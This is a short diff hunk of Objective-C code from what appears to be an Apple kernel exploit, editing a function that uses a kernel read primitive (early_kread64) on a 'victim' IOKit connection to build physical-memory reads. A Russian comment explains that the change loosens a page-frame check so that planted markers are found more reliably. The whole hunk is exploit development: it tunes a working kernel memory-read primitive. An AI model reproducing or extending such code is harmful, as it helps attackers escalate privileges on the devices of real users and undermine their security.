@@ -188,10 +188,13 @@ static BOOL kpPhysRead16K(io_connect_t victim, const uint8_t *tsdV, uint32_t dst
         uint64_t buf = hdr ? kp_untag_ptr(early_kread64(hdr + 0x10)) : 0;
         uint32_t cnt = buf ? (uint32_t)early_kread64(buf + 0x28) : 0;
         uint64_t e0 = buf ? early_kread64(buf + 0x30) : 0;
-        BOOL ok = buf && cnt && cnt < 0x1000 && (uint32_t)e0 == rdPfn32 &&
+        // 1.9.255b: точное pfn-равенство роняло маркеры при rdPA=0/расхождении
+        // vtophys на свежей поверхности (rdVA уже верифицирован по rdID — цепочка
+        // наша). Достаточно формы записи: lo32≠0, hi32∈{0,4}.
+        BOOL ok = buf && cnt && cnt < 0x1000 && (uint32_t)e0 != 0 &&
                   ((uint32_t)(e0 >> 32) == 0 || (uint32_t)(e0 >> 32) == 4);
-        kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA=%#llx type=%#llx buf=%#llx cnt=%#x entry0=%#018llx — %@",
-                  (unsigned long long)rdVA, (unsigned long long)typ, (unsigned long long)buf, cnt,
+        kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA=%#llx rdPA=%#llx type=%#llx buf=%#llx cnt=%#x entry0=%#018llx — %@",
+                  (unsigned long long)rdVA, (unsigned long long)rdPA, (unsigned long long)typ, (unsigned long long)buf, cnt,
                   (unsigned long long)e0, ok ? @"OK" : @"маркеры МИМО"]);
         if (ok) rdBuf = buf;
     }
